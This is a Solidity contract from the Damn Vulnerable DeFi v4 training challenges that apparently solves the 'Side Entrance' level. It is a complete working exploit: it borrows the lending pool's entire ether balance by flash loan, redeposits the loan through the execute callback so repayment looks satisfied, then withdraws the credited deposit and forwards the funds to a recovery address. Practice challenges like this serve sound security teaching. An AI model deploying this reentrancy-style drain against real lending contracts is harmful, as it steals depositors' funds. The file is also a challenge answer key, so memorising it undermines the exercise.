// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from './SideEntranceLenderPool.sol';

contract SideEntranceLenderPoolRescuer {
    SideEntranceLenderPool private immutable pool; 
    address private immutable recovery;
    constructor(SideEntranceLenderPool _pool, address _recovery) payable {
        pool = _pool;
        recovery = _recovery;
    } 

    function rescue() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }
}
